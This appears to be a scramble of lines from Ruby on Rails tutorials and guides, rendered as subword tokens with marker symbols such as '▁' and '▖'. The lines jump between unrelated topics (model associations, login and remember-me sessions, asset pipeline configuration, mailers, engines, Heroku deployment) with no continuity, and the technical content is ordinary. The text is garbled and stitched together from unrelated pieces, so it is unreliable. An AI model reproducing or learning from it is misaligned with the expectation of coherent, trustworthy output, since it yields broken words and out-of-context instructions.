▁" hello "▖ to (10) ▁# ▁=> ▁" hello "
▁To ▁write ▁the ▁application ▁code , ▁we ▁define ▁the ▁\ k ode { belongs \_ to } ▁relationship ▁as ▁usual .
▁In ▁this ▁section , ▁we ' ll ▁add ▁this ▁necessary ▁ signout ▁cap ability .
▁So , ▁after ▁making ▁this ▁change ▁they ▁will ▁have ╼ access ▁to ▁the ▁main ▁application ' s ▁` Application Controller `, ▁as ▁though ▁they ▁were ╼ part ▁of ▁the ▁main ▁application .
▁Return s ▁a ▁new ▁Relationship ▁object ▁ associated ▁with ▁\ k ode { user }
▁config ▖ active _ record ▖ schema _ format ▁= ▁: ruby
▁╼╼\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )╼\ label { sec : activation _ resets _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁ K eep - A li ve : ▁time out = 15 , ▁ max = 1 00 ▁show n ▁as ▁the ▁ redirected ▁page ]
▁# ▁=> ▁Sun ▁Mar ▁28 ▁0 3 :00:00 ▁+0200 ▁2010
▁Otherwise , ▁change ▁the ▁user name ▁and ▁password ▁in ▁the ▁` development ` ▁section ▁as ▁appropriate .
▁config ▖ action _ mailer ▖ delivery _ method ▁= ▁: sendmail
▁Whi ch ▁will ▁execute :
▁ maximum : ▁ 400 ,
▁NOTE : ▁Rails ▁uses ▁an ▁SQLite 3 ▁database ▁for ▁data ▁ storage ▁by ▁default ▁because ▁it ▁is ▁a ▁ zero ▁configuration ▁database ▁that ▁just ▁works ▖
▁#### ▁Using ▁a ▁Controller ▁Provide d ▁by ▁the ▁Application
▁S P 1, ▁ Firefox ▁ v 2▖0▖ 0▖5 ▁and ▁O pe ra ▁ 9 ▖ 5 ▖ ▁ Safari ▁is ▁ still ▁consider ing , ▁it ▁ignore s ▁the ▁option ▖
▁A ▁model ▁may ▁find ▁it ▁useful ▁to ▁set ▁`: instance _ accessor ` ▁to ▁` false ` ▁as ▁a ▁way ▁to ▁prevent ▁ mass - assignment ▁from ▁setting ▁the ▁attribute .
▁A ▁` has _ and _ belongs _ to _ many ` ▁association ▁creates ▁a ▁direct ▁many - to - many ▁connection ▁with ▁another ▁model , ▁with ▁no ▁inter ve n ing ▁model ▖
▁In ▁fact , ▁the ▁` c attr _ * ` ▁ macro s ▁are ▁just ▁alias es ▁for ▁the ▁` m attr _ * ` ▁ macro s ▖
▁Listing ~\ ref { code : length _ validation _ test } ▁shows ▁the ▁result ing ▁tests .
▁| ▁| ▁5 11 ▁| ▁: net work _ authentication _ require d ▁|
▁validates ▁: name , ▁uniqueness : ▁ { ▁case _ sensitive : ▁false ▁ }
▁=> ▁" user @ example ▖ com "
▁m attr _ accessor ▁: load ed
▁This ▁will ▁involve ▁using ▁the ▁\ k ode { < title > } ▁tag ▁in ▁our ▁page ▁views .
▁Let ' s ▁ im a g in e ▁that ▁users ▁in ▁some ▁application ▁have ▁login ▁information ▁in ▁the ▁` User ` ▁model ▁but ▁name ▁and ▁other ▁data ▁in ▁a ▁separate ▁` Pro file ` ▁model :
▁We ' ll ▁see ▁in ▁just ▁a ▁moment ▁the ▁benefit s ▁of ▁adding ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model ▁( Section ~\ ref { sec : creating _ and _ authenticating _ a _ user }), ▁but ▁first ▁we ' ll ▁add ▁a ▁minimal ▁requirement ▁on ▁password ▁security .
▁In ▁such ▁cases ▁don ' t ▁ forget ▁to ▁add ▁the ▁`: content _ type ` ▁option ▖
▁=> ▁" foo @ bar ▖ com "
▁Active ▁Record ▁comes ▁with ▁a ▁large ▁number ▁of ▁methods ▁for ▁creating ▁and ▁ manipulati n g ▁data ▁models .
▁To ▁move ▁on ▁from ▁ submitting ▁bug s ▁to ▁help ing ▁re s ol ve ▁existing ▁issues ▁or ▁con t ri but ing ▁your ▁own ▁code ▁to ▁Ruby ▁on ▁Rails , ▁you ▁ _ must _ ▁be ▁able ▁to ▁run ▁its ▁test ▁suite ▖
▁R at her ▁than ▁ ra is ing ▁an ▁exception , ▁this ▁method ▁returns ▁\ k ode { nil } ▁( in d ic ating ▁no ▁such ▁user ) ▁if ▁the ▁id ▁is ▁invalid .
▁or ▁yields ▁them ▁in ▁turn ▁if ▁a ▁block ▁is ▁passed :
▁The ▁login ▁system ▁we ▁ finished ▁in ▁Section ~\ ref { sec : logging _ in } ▁is ▁self - contain ed ▁and ▁fully ▁functional , ▁but ▁most ▁website s ▁have ▁the ▁ additional ▁cap ability ▁of ▁remember ing ▁users ' ▁sessions ▁even ▁after ▁they ▁close ▁their ▁browsers .
▁This ▁route ▁would ▁match ▁` photos / 12 ` ▁or ▁` / photos / long / path / to / 12 `, ▁setting ▁` params [: other ]` ▁to ▁` " 12 " ` ▁or ▁` " long / path / to / 12 " ` ▖
▁As ▁usual , ▁it ' s ▁a ▁good ▁idea ▁to ▁verify ▁that ▁the ▁test ▁suite ▁is ▁\ passing \ ▁before ▁proceeding :
▁T w o ▁good ▁native ▁clients ▁for ▁OS ~ X ▁are ▁\ href { http :// col lo q u y ▖ info /}{ Co ll o q u y } ▁and ▁\ href { http :// li me cha t ▖ net / ma c /}{ L i me C h at } .
▁default ▁from : ▁' notification s @ example ▖ com '
▁` config ▖ active _ record ` ▁includes ▁a ▁variety ▁of ▁configuration ▁options :
▁A ▁schematic ▁representation ▁of ▁the ▁model - view - controller ▁( MVC ) ▁architecture .
▁Use ▁the ▁assets ▁pipeline ▁feature .
▁A lthough ▁the ▁layout ▁in ▁Listing ~\ ref { code : layout _ new _ structure } ▁serve s ▁its ▁purpose , ▁it ' s ▁getting ▁a ▁little ▁ clu tt er ed .
▁* ▁` collection ▖ size `
▁create ▁test / controllers / blorgh / comments _ controller _ test ▖ rb
▁# ▁Documentation ▁comment
▁Even ▁though ▁the ▁content ▁will ▁be ▁restrict ed ▁to ▁few er ▁than ▁ 140 ▁characters ▁( Section ~\ ref { sec : micropost _ validations }) ▁and ▁hence ▁would ▁fit ▁inside ▁the ▁2 55 - character ▁\ k ode { string } ▁type , ▁using ▁\ k ode { text } ▁better ▁express es ▁the ▁nature ▁of ▁microposts , ▁which ▁are ▁more ▁natural ly ▁though t ▁of ▁as ▁blocks ▁of ▁text .
▁user 	 0 m 1 ▖ 2 59 s
▁This ▁is ▁very ▁helpful ▁for ╼ assets ▁that ▁are ▁not ▁ modified ▁so ▁that ▁a ▁browser ▁does ▁not ▁need ▁to ▁re - download ▁a ╼ web site ' s ▁CSS ▁or ▁javascript ▁on ▁every ▁request ▖
▁ ╼ ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App
▁You ▁can ▁pass ▁in ▁a ▁ numeric al ▁argument ▁to ▁the ▁` first ` ▁method ▁to ▁return ▁up ▁to ▁that ▁number ▁of ▁results ▖
▁It ' s ▁worth ▁noting ▁that ▁we ▁can ▁also ▁run ▁all ▁the ▁request ▁ spec s ▁by ▁passing ▁the ▁whole ▁directory ▁instead ▁of ▁just ▁one ▁file :
▁| ▁| ▁50 7 ▁| ▁: in sufficient _ storage ▁|
▁To ▁examine ▁the ▁relationship ▁between ▁the ▁Users ▁controller ▁and ▁the ▁User ▁model , ▁let ' s ▁focus ▁on ▁a ▁ simplified ▁version ▁of ▁the ▁\ k ode { index } ▁action , ▁show n ▁in ▁Listing ~\ ref { code : demo _ index _ action } .
▁ Comment ing ▁out ▁the ▁before ▁filter ▁to ▁test ▁our ▁security ▁model ▖
▁### ▁Specif y ing ▁Conditions ▁on ▁the ▁ J o in ed ▁Table s
▁This ▁means ▁that ▁the ▁line
▁The ▁difference ▁is ▁that ▁an ▁engine ▁is ▁consider ed ▁a ▁" full ▁plugin " ▁by ╼ Rails ▁( as ▁indicate d ▁by ▁the ▁`-- full ` ▁option ▁that ' s ▁passed ▁to ▁the ▁generator ╼ command )▖
▁( We ▁have ▁omitted ▁the ▁\ k ode { : partial } ▁parameter ▁in ▁previous ▁rendering s , ▁writing , ▁e ▖ g ▖ , ▁\ k ode { render ▁' shared / micropost ' }, ▁but ▁with ▁a ▁\ k ode { : collection } ▁parameter ▁that ▁syntax ▁doesn ' t ▁work ▖)
▁To ▁make ▁the ▁actual ▁index ▁page , ▁we ▁need ▁to ▁make ▁a ▁view ▁that ▁iterate s ▁through ▁the ▁users ▁and ▁wrap s ▁each ▁one ▁in ▁an ~\ k ode { li } ▁tag .
▁------------ --------
▁On ▁the ▁1▖9 ▁front , ▁Ruby ▁1▖9 ▖ 1 ▁is ▁not ▁us able ▁because ▁it ▁out right ▁ s eg fa ul t s , ▁so ▁if ▁you ▁want ▁to ▁use ▁1▖9 ▖ x , ▁jump ▁ str a ight ▁to ▁ 1▖9▖3 ▁for ▁ s m oo th ▁ s ailing .
▁In ▁particular , ▁the ▁value ▁of
▁The ▁Home ▁page ▁with ▁no ▁custom ▁page ▁title ▖
▁When ▁static ▁assets ▁are ▁deploy ed ▁with ▁each ▁new ▁release ▁of ▁code , ▁the ▁m time ╼ ( time ▁of ▁last ▁modification ) ▁of ▁ _ all _ ▁these ▁files ▁changes , ▁for c ing ▁all ▁remote ╼ client s ▁to ▁fetch ▁them ▁again , ▁even ▁when ▁the ▁content ▁of ▁those ▁assets ▁has ▁not ▁changed .
▁== ▁Create Comments : ▁migrat ed ▁( 0 ▖ 0 1 19 s ) ▁= ============== ========= ================
▁You ▁can ▁do ▁anything ▁you ▁like ▁to ▁check ▁for ▁valid ▁data ▁within ▁the ▁block ▖
▁( The ▁\ href { http :// github ▖ com / ve r t ig in ous / p i k } { P i k } ▁project ▁accomplish es ▁a ▁similar ▁ fe at ▁on ▁Windows ▖)
▁<%= ▁render ▁" blorgh / comments / form " ▁%>
▁Note ▁that ▁` save ` ▁also ▁has ▁the ▁ability ▁to ▁skip ▁validations ▁if ▁passed ▁` validate : ╼ false ` ▁as ▁argument ▖
▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App
▁* ▁` config ▖ log _ format ter ` ▁defines ▁the ▁format ter ▁of ▁the ▁Rails ▁ logger ▖
▁in ▁Listing ~\ ref { code : log _ out _ method } .
▁The ▁` head ` ▁method ▁accept s ▁a ▁number ▁or ▁symbol ▁( see ▁[ ref er ence ▁table ](# the - status - option ) ) ▁represent ing ▁a ▁HTTP ▁status ▁code ▖
▁ Content - Type : ▁text / css
▁It ' s ▁time ▁to ▁change ▁that .
▁get ▁' welcome / index '
▁Add ▁` gem ▁' spring ', ▁group : ▁: development ` ▁to ▁your ▁` Gemfile ` .
▁Un like ▁controllers , ▁the ▁mailer ▁instance ▁doesn ' t ▁have ▁any ▁context ▁about ▁the ╼ in com ing ▁request ▁so ▁you ' ll ▁need ▁to ▁provide ▁the ▁`: host ` ▁parameter ▁yourself .
▁Rails ▁is ▁ s m ar t ▁enough ▁to ▁ s po t ▁the ▁forward ▁ slash ▁in ▁that ╼ string ▁and ▁real ize ▁that ▁you ▁want ▁to ▁render ▁the ▁` _ form ▖ html ▖ erb ` ▁file ▁in ╼ the ▁` app / views / comments ` ▁directory .
▁( The ▁results ▁are ▁long , ▁so ▁I ' ve ▁used ▁vertical ▁do t s ▁to ▁indicate ▁omitted ▁output ▖)
▁It ▁only ▁check s ▁to ▁see ╼ w hether ▁there ▁are ▁errors ▁found ▁on ▁an ▁individual ▁attribute ▁of ▁the ▁object .
▁T a k en ▁together , ▁the ▁material ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁through ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets } ▁develop s ▁a ▁full ▁Rails ▁login ▁and ▁authentication ▁system .
▁ Callbacks ▁allow ▁you ▁to ╼ tr ig g er ▁logic ▁during ▁the ▁ life c y c le ▁of ▁a ▁job .
▁This ▁method ▁escape s ▁what ever ▁is ▁needed , ▁both ▁for ▁the ▁key ▁and ▁the ▁value :
▁Recall ▁from ▁the ▁discussion ▁in ▁Section ~\ ref { sec : account _ activation _ mailer } ▁that ▁the ▁activation ▁token ▁and ▁email ▁are ▁available ▁as ▁\ k ode { params [: id ]} ▁and ▁\ k ode { params [: email ]} , ▁respectively .
▁Here ▁is ▁an ▁example ▁to ▁switch ▁to ▁the ▁4 - 0 - s table ▁branch :
▁The ▁implementation ▁appears ▁in ▁Listing ~\ ref { code : authenticated _ p } .
▁( If ▁you ▁look ▁at ▁the ▁generated ▁Users ▁controller ▁tests ▁from ▁the ▁toy ▁app ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁you ' ll ▁see ▁the ▁code ▁above ▖)
▁As ▁we ' ll ▁see , ▁many ▁of ▁the ▁idea s ▁are ▁similar ▁to ▁our ▁work ▁in ▁Section ~\ ref { sec : showing _ all _ users } ▁on ▁ showing ▁all ▁users .
▁Because ▁the ▁object ▁is ▁not ▁yet ▁store d ▁in ▁the ▁database , ▁the ▁SQL ▁generated ▁look s ▁like ▁this :
▁To ▁display ▁the ▁messages ▁in ▁the ▁browser , ▁we ' ll ▁render ▁an ▁error - messages ▁partial ▁on ▁the ▁user ▁\ k ode { new } ▁page ▁while ▁adding ▁the ▁CSS ▁class ▁\ k ode { form - control } ▁( which ▁has ▁special ▁meaning ▁to ▁Bootstrap ) ▁to ▁each ▁entry ▁field , ▁as ▁show n ▁in ▁Listing ~\ ref { code : f _ error _ messages } .
▁( P re s ence ▁validations ▁for ▁the ▁password ▁and ▁its ▁confirmation ▁are ▁automatically ▁added ▁by ▁\ k ode { has \_ secure \_ password } ▖)
▁Generat ing ▁a ▁User ▁model .
▁# ▁If ▁the ▁argument ▁is ▁false ▁( default ▁is ▁+ nil + ), ▁the ▁context ▁is
▁Some what ▁ s up ri s ing ly , ▁here ▁\ k ode { b } ▁get s ▁ reverse d ▁as ▁well ▁as ▁\ k ode { a } .
▁### ▁Work ing ▁with ▁ V al ue s
▁That ▁ s a id , ▁when ▁using ▁ pronoun s ▁in ▁reference ▁to ▁a ▁h y po the t ical ▁person , ▁such ▁as ▁" a ╼ user ▁with ▁a ▁session ▁cookie ", ▁g end er ▁ ne u tr al ▁ pronoun s ▁( the y / the ir / the m ) ▁should ▁be ╼ used ▖
▁( We ' ll ▁learn ▁how ▁to ▁handle ▁custom ▁image ▁upload ▁in ▁Section ~\ ref { sec : micropost _ images } ▖)
▁# ▁=> ▁[" Name ▁cannot ▁contain ▁the ▁characters ▁ !
▁The ▁defaults ▁for ▁these ▁options ▁can ▁be ▁local ize d , ▁their ▁keys ▁are :
▁The ▁` require _ tree ` ▁ directive ▁tell s ▁Sprockets ▁to ▁ recursive ly ▁include ▁ _ all _ ╼ JavaScript ▁files ▁in ▁the ▁specified ▁directory ▁into ▁the ▁output ▖
▁GET ▁ / patients / 17
▁The ▁Home ▁page ▁with ▁a ▁form ▁error .
▁ Allow s ▁you ▁to ▁me a sure ▁the ▁execut ion ▁time ▁of ▁a ▁block ▁in ▁a ▁template ▁and ▁records ▁the ▁result ▁to ▁the ▁log ▖
▁| Gemfile < br > Gemfile ▖ lock | The se ▁files ▁allow ▁you ▁to ▁specify ▁what ▁gem ▁ dependencies ▁are ▁needed ▁for ▁your ▁Rails ▁application ▖
▁After ▁the ▁ div s , ▁we ▁ en counter ▁some ▁ embedded ▁Ruby :
▁Fin ally , ▁engines ▁would ▁not ▁have ▁been ▁possible ▁without ▁the ▁work ▁of ▁ J a me s ▁A d a m ,╼ P io tr ▁S ar n ac k i , ▁the ▁Rails ▁ Core ▁T ea m , ▁and ▁a ▁number ▁of ▁other ▁people ▖
▁If ▁you ▁roll ed ▁back ▁the ▁database , ▁ migrate ▁up ▁again ▁before ▁proceeding :
▁#### ▁` classify `
▁Rails ▁4▖0 ▁removed ▁the ▁` assets ` ▁group ▁from ▁Gemfile ▖
▁( Writ ing ▁a ▁test ▁for ▁email ▁downcas ing ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ uniqueness _ validation })▖)
▁That ' s ▁a ▁lot ▁of ▁work , ▁though , ▁and ▁ l uckily ▁we ▁won ' t ▁need ▁it ▁here : ▁for ▁an ▁application ▁running ▁on ▁a ▁Heroku ▁domain ▁( such ▁as ▁the ▁sample ▁application ), ▁we ▁can ▁p ig g y back ▁on ▁Heroku ' s ▁SSL ▁c er t if ic ate .
▁( Note ▁the ▁reuse ▁of ▁the ▁\ k ode { box \_ sizing } ▁ mixin ▁from ▁Listing ~\ ref { code : mixin _ and _ debug } ▖)
▁In ▁Listing ~\ ref { code : user _ login _ test _ valid _ information }, ▁we ▁logged ▁a ▁user ▁in ▁using ▁the ▁\ k ode { post } ▁method ▁and ▁a ▁valid ▁\ k ode { session } ▁hash , ▁but ▁it ' s ▁cumbersome ▁to ▁do ▁this ▁every ▁time .
▁There ' s ▁one ▁more ▁subtlety , ▁which ▁is ▁that ▁for ▁some ▁reason ▁inside ▁tests ▁the ▁\ k ode { cookies } ▁method ▁doesn ' t ▁work ▁with ▁symbols ▁as ▁keys , ▁so ▁that
▁An ▁example ▁of ▁the ▁flash ▁persist ing ▖ ~\ href { http :// railstutorial ▖ org / images / figures / flash _ persistence _ bootstrap - full ▖ png }{( full ▁size )}
▁Set ▁` include _ seconds ` ▁to ▁true ▁if ▁you ▁want ▁more ▁ detailed ▁app r o x im ation s .
▁* ▁` render ▁: body ` ▁will ▁* not * ▁set ▁the ▁content ▁type ▁header .
▁The ▁most ▁generic ▁way ▁to ▁jump ▁to ▁another ▁ datetime ▁is ▁` advance ` ▖
▁\ emph { Sass } ▁is ▁a ▁language ▁for ▁writing ▁stylesheets ▁that ▁improve s ▁on ▁CSS ▁in ▁many ▁ways .
▁This ▁usage ▁is ▁reflect ed ▁in ▁the ▁mockup ▁ sequence ▁starting ▁in ▁Figure ~\ ref { fig : page _ flow _ profile _ mockup } ▁and ▁show n ▁in ▁close - up ▁in ▁Figure ~\ ref { fig : stats _ partial _ mockup } .
▁as ▁show n ▁in ▁Listing ~\ ref { code : sign _ in _ helper } .
▁TIP : ▁All ▁of ▁the ▁following ▁models ▁use ▁` id ` ▁as ▁the ▁primary ▁key , ▁unless ▁specified ▁otherwise .
▁in ▁Listing ~\ ref { code : admin _ spec s } .
▁Support ▁for ▁all ▁of ▁the ▁previous ▁Ruby ▁versions ▁has ▁been ▁ drop ped ▁of ficial ly ▖
▁S ub m it ting ▁the ▁\ href { http ://0▖0▖0▖0:3000/ sessions / new }{/ sessions / new } ▁form ▁then ▁yields ▁the ▁result ▁show n ▁in ▁Figure ~\ ref { fig : initial _ failed _ login _ rails _3} .
▁This ▁ div ide s ▁natural ly ▁into ▁two ▁parts : ▁first , ▁find ▁a ▁user ▁by ▁email ▁address ; ▁second , ▁ authenticate ▁the ▁user ▁with ▁a ▁given ▁password .
▁in ▁Listing ~\ ref { code : remember _ me _ checkbox } .
▁A ▁diagram ▁of ▁this ▁inheritance ▁hierarchy ▁appears ▁in ▁Figure ~\ ref { fig : string _ inheritance _ ruby _ 1 _ 9 } .
▁The ▁Rails ▁team ▁ strong ly ▁encourag es ▁you ▁to ▁write ▁your ▁CoffeeScript ▁( and ╼ JavaScript ) ▁in ▁this ▁style , ▁and ▁you ▁can ▁expect ▁that ▁many ▁libraries ▁will ▁also ╼ follow ▁this ▁pattern .
▁This ▁practice ▁of ▁remember ing ▁variable ▁assignment s ▁from ▁one ▁method ▁ invocation ▁to ▁the ▁next ▁is ▁known ▁as ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / M emoization }{\ emph { m emoization } } .
▁=> ▁" Michael "
▁You ▁can ▁also ▁run ▁any ▁single ▁test ▁separate ly :
▁Fin ally , ▁it ' s ▁possible ▁to ▁associate ▁`: if ` ▁and ▁`: unless ` ▁with ▁a ▁` Proc ` ▁object ╼ which ▁will ▁be ▁called ▖
▁* ▁[ O f ficial ▁Ruby ▁ Programming ▁ Language ▁website ]( https :// www ▖ ruby - lang ▖ org / en / document ation / )
▁If ▁you ' re ▁using ▁the ▁cloud ▁IDE , ▁it ' s ▁often ▁useful ▁to ▁use ▁the ▁`` Go to ▁An y th ing '' ▁command , ▁which ▁make s ▁it ▁easy ▁to ▁navigate ▁the ▁file system ▁by ▁typing ▁in ▁partial ▁filename s .
▁Then ▁install ▁as ▁usual :
▁The ▁\ k ode { create \_ table } ▁method ▁accept s ▁a ▁block ▁( Section ~\ ref { sec : block s }) ▁with ▁one ▁block ▁variable , ▁in ▁this ▁case ▁called ▁\ k ode { t } ▁( for ▁`` table '') .
▁For ▁every ▁single ▁method ▁defined ▁as ▁a ▁ core ▁extension ▁this ▁guide ▁has ▁a ▁note ▁that ▁say s ▁where ▁such ▁a ▁method ▁is ▁defined ▖
▁This ▁code , ▁called ▁a ▁\ emph { method ▁reference }, ▁arrange s ▁for ▁Rails ▁to ▁look ▁for ▁a ▁method ▁called ▁\ k ode { create \_ remember \_ token } ▁and ▁run ▁it ▁before ▁saving ▁the ▁user .
▁Or , ▁in ▁English : ▁" return ▁a ▁ Category ▁object ▁for ▁all ▁categories ▁with ▁articles "▖
▁class ▁D ▁< ▁C ; ▁end
▁As ▁with ▁the ▁case ▁of ▁the ▁User ▁model ▁( Listing ~\ ref { code : generate _ user _ model }), ▁we ▁generate ▁the ▁Micropost ▁model ▁using ▁\ k ode { generate ▁model } :
▁#### ▁Consider ation s ▁when ▁ deploying ▁to ▁a ▁sub directory
▁" application - 1 c 57 5278 9 5 88 ac 18 d 7 e 1 a 50 b 1 f 0 fd 4 c 2▖ css ",
▁# ▁` mod _ expire s ` ▁to ▁be ▁enabled .
▁It ▁then ▁tests ▁that ▁the ▁page ▁content ▁and ▁title ▁both ▁contain ▁the ▁user ' s ▁name .
▁When ▁the ▁` mail ` ▁method ▁will ▁be ▁trigger ed , ▁it ▁will ▁send ▁a ▁ multipart ▁email ▁with ╼ ▁an ▁ attachment , ▁properly ▁nested ▁with ▁the ▁to p ▁level ▁being ▁` multipart / m i x ed ` ▁and ╼ ▁the ▁first ▁part ▁being ▁a ▁` multipart / alternative ` ▁containing ▁the ▁plain ▁text ▁and ╼ ▁HTML ▁email ▁messages .
▁( We ▁could ▁have ▁switch ed ▁from ▁\ k ode { user } ▁to ▁\ k ode { self }, ▁but ▁recall ▁from ▁Section ~\ ref { sec : the _ c a ve at } ▁that ▁\ k ode { self } ▁is ▁optional ▁inside ▁the ▁model ▖)
▁@ logger ▖ debug ( format _ log _ en try ( name , ▁ sql ▖ s q ue e z e (' ▁ ') ) )
▁$ ▁rake ▁ railties : install : migrations
▁The ▁methods ▁` beginning _ of _ quarter ` ▁and ▁` end _ of _ quarter ` ▁return ▁the ▁date s ▁for ▁the ▁beginning ▁and ▁end ▁of ▁the ▁ quarter ▁of ▁the ▁receiver ' s ▁c al end ar ▁ year :
▁We ▁call ▁this ▁' u nobtrusive ' ▁JavaScript ▁because ▁we ' re ▁no ▁longer ▁mix ing ▁our ╼ JavaScript ▁into ▁our ▁HTML ▖
▁The ▁best ▁way ▁to ▁use ▁this ▁guide ▁is ▁to ▁follow ▁each ▁step ▁as ▁it ▁happens , ▁no ▁code ▁or ╼ step ▁needed ▁to ▁make ▁this ▁example ▁application ▁has ▁been ▁left ▁out , ▁so ▁you ▁can ╼ li ter ally ▁follow ▁along ▁step ▁by ▁step ▖ ╼╼
▁ Content s
▁### ▁ Overriding ▁the ▁` new ` ▁and ▁` edit ` ▁S eg ment s
▁One ▁common ▁question ▁when ▁learning ▁Rails ▁is ▁whether ▁to ▁learn ▁Ruby ▁first .
▁The ▁ compressor ▁config ▁settings ▁for ▁CSS ▁and ▁JavaScript ▁also ▁take ▁any ▁object ▖╼
▁We ▁have n ' t ▁discuss ed ▁arrays ▁yet ▁in ▁the ▁\ emph { Rails ▁Tutorial }, ▁but ▁understanding ▁them ▁gives ▁a ▁good ▁foundation ▁for ▁understanding ▁hashes ▁( Section ~\ ref { sec : hashes _ and _ symbols }) ▁and ▁for ▁aspect s ▁of ▁Rails ▁data ▁ modeling ▁( such ▁as ▁the ▁\ k ode { has \_ many } ▁association ▁seen ▁in ▁Section ~\ ref { sec : demo _ user _ has _ many _ microposts } ▁and ▁covered ▁more ▁in ▁Section ~\ ref { sec : user _ micropost _ associations }) .
▁However , ▁please ▁secure ▁your ▁database ▁configuration , ▁e ▖ g ▖ ▁` config / database ▖ yml `, ▁and ▁your ▁server - side ▁secret , ▁e ▖ g ▖ ▁store d ▁in ▁` config / secrets ▖ yml ` ▖
▁We ' ll ▁deal ▁with ▁the ▁microposts ▁list ▁moment ar ily , ▁but ▁there ▁are ▁sever al ▁other ▁things ▁to ▁note ▁first .
▁The ▁effect ▁of ▁a ▁micropost ▁presence ▁validation .
▁( We ' ll ▁learn ▁a ▁more ▁ el eg an t ▁method ▁for ▁doing ▁this ▁in ▁Chapter ~\ ref { cha : sign _ up } ▖)
▁so cket : ▁ / t mp / mysql ▖ so c k
▁# ▁=> ▁Tue , ▁ 08 ▁Jun ▁2010 ▁01 :00:00 ▁+0000
▁With ▁that , ▁the ▁user ▁index ▁is ▁fully ▁functional , ▁with ▁all ▁tests ▁passing :
▁By ▁using ▁an ▁initializer , ▁the ▁configuration ▁will ▁be ▁set ▁up ▁before ▁the ╼ application ▁start s ▁and ▁calls ▁the ▁engine ' s ▁models , ▁which ▁may ▁depend ▁on ▁this ╼ configuration ▁setting ▁existing .
▁ From ▁an ▁instance ▁of ▁the ▁` Employee ` ▁model , ▁you ▁can ▁retrieve ▁a ▁collection ▁of ▁ picture s : ▁`@ employee ▖ picture s ` .
▁If ▁you ▁refresh ▁the ▁page ▁now , ▁you ' ll ▁see ▁the ▁exact ▁same ▁form ▁as ▁in ▁the ▁example ▖╼
▁It ▁is ▁important ▁to ▁understand ▁that ▁` html _ safe ` ▁perform s ▁no ▁es c a p ing ▁what so ever , ▁it ▁is ▁just ▁an ▁ assert ion :
▁The ▁rest ▁of ▁this ▁section ▁is ▁d ed icated ▁to ▁ deploying ▁our ▁first ▁application ▁to ▁Heroku .
▁We ▁start ▁by ▁noting ▁a ▁common ▁idiom ▁for ▁changing ▁a ▁current ly ▁defined ▁variable .
▁There for e , ▁engines ▁and ▁applications ▁can ▁be ▁though t ▁of ▁ al most ▁the ▁same ▁thing ,╼ just ▁with ▁ subtle ▁difference s , ▁as ▁you ' ll ▁see ▁throughout ▁this ▁guide ▖
▁The ▁first ▁example ▁shows ▁` in _ groups _ of ` ▁fill s ▁the ▁last ▁group ▁with ▁as ▁many ▁` nil ` ▁elements ▁as ▁needed ▁to ▁have ▁the ▁request ed ▁size ▖
▁Re g ar d ing ▁the ▁Rails ▁ Stack
▁By ▁including ▁\ k ode { password \_ digest : string }, ▁we ' ve ▁given ▁Rails ▁enough ▁information ▁to ▁construct ▁the ▁entire ▁migration ▁for ▁us , ▁as ▁seen ▁in ▁Listing ~\ ref { code : password _ migration } .
▁as ▁show n ▁in ▁Listing ~\ ref { code : sessions _ helper _ authenticate } .
▁=> ▁" test "
▁A ╼ t y p ical ▁manifest ▁file ▁look s ▁like :
▁### ▁` pluck `
▁I ▁generally ▁use ▁the ▁convention ▁of ▁ putting ▁such ▁assignment s ▁in ▁parentheses , ▁which ▁is ▁a ▁ visual ▁re m in d er ▁that ▁it ' s ▁not ▁a ▁compar is on .
▁order _ id s
▁as ▁show n ▁in ▁Listing ~\ ref { code : generalized _ current _ user } .
▁Like ▁the ▁` video _ tag `, ▁the ▁` audio _ tag ` ▁has ▁special ▁options :
▁S pe ll ▁names ▁correctly : ▁A rel , ▁ Test :: Uni t , ▁RSpec , ▁HTML , ▁ MySQL , ▁JavaScript , ▁ ERB ▖
▁ Write ▁the ▁corresponding ▁application ▁code .
▁### ▁` numericality `
▁We ▁see ▁in ▁Listing ~\ ref { code : generated _ application _ mailer } ▁that ▁there ▁is ▁a ▁default ▁\ k ode { from } ▁address ▁common ▁to ▁all ▁ mailers ▁in ▁the ▁application , ▁and ▁each ▁method ▁in ▁Listing ~\ ref { code : generated _ user _ mailer } ▁has ▁a ▁re ci p i ent ' s ▁address ▁as ▁well .
▁Scopes ▁take ▁ anonymous ▁function s ▁as ▁arguments .
▁You ▁can ▁then ▁use ▁this ▁variable ▁any where ▁in ▁your ▁templates ▁or ▁layout .
▁S ince ▁both ▁pages ▁will ▁be ▁\ emph { showing } ▁data , ▁the ▁proper ▁HTTP ▁verb ▁is ▁a ▁\ text tt { GET } ▁request , ▁so ▁we ▁use ▁the ▁\ k ode { get } ▁method ▁to ▁arrange ▁for ▁the ▁URLs ▁to ▁respond ▁appropriate ly .
▁If ▁you ▁deploy ▁on ▁Heroku , ▁you ▁should ▁follow ▁the ▁\ href { http :// dev center ▖ heroku ▖ com / articles / full - text - search } { Heroku ▁full ▁text ▁search } ▁instructions .
▁* ▁` config ▖ action _ controller ▖ allow _ forgery _ protection ` ▁enable s ▁or ▁disable s ▁CSRF ▁ protection ▖
▁( It ▁actually ▁works ▁either ▁way , ▁but ▁logic ally ▁it ▁make s ▁more ▁sense ▁to ▁ interpolate ▁in ▁this ▁context ▖)
▁You ▁can ▁also ▁specify ▁these ▁assets ▁as ▁ dependencies ▁of ▁other ▁assets ▁using ▁ Asset ╼ P ip e line ▁require ▁statement s ▁in ▁processed ▁files :
▁errors ▖ add (: customer _ id , ▁" is ▁not ▁active ") ▁unless ▁customer ▖ active ?
▁An ▁( unsuccessful ) ▁attempt ▁at ▁handling ▁failed ▁login .
▁The ▁first ▁step ▁is ▁to ▁\ href { http :// api ▖ heroku ▖ com / signup } { sign ▁up ▁for ▁Heroku } .
